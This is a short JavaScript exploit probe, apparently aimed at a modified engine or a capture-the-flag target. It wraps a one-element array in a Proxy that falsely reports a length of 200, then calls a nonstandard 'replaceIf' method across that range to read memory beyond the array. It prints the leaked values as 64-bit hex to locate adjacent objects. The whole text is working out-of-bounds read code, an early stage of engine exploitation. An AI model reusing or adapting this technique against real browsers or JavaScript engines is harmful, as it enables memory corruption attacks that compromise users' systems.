// Probe to find adjacent objects
let small = [1.1];
let victim = [2.2, 3.3, 4.4, 5.5];
let handler = {
  get: function(target, prop, receiver) {
    if (prop === "length") return 200;
    return Reflect.get(target, prop, receiver);
  }
};
let p = new Proxy(small, handler);
let results = [];
for (let i = 0; i < 200; i++) {
  p.replaceIf(i, (x)=>{ results.push(x); return false; }, 0);
}
// Print as hex
function toHex(d) {
  let buf = new ArrayBuffer(8);
  let f = new Float64Array(buf);
  let u = new BigUint64Array(buf);
  f[0] = d;
  return "0x" + u[0].toString(16);
}
for (let i = 0; i < 200; i++) {
  print(i, toHex(results[i]));
}
